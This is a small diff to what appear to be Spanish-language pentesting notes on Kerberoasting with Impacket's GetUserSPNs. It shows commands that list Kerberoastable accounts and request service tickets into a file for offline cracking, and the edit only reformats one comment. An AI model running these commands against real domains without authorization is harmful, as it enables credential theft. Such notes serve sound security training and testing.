@@ -27,7 +27,9 @@ GetUserSPNs en Impacket: La funcionalidad GetUserSPNs se utiliza específicament
 ❯ impacket-GetUserSPNs domain.corp/user:Password     # Mirar si el usuario es Kerberosteable y listar los usuarios a los que se le puede solicitar un TGS
 
 ❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request  # Solicitar un TGS 
-❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request -outputfile kerb.txt  # Solicitar varios TGS
+
+# Solicitar varios TGS
+❯ impacket-GetUserSPNs domain1.corp/user:Password -dc-ip IP -request -outputfile kerb.txt  
 	
 	# dc-ip = Dirección IP del DC
 	# domain1 = Dominio 
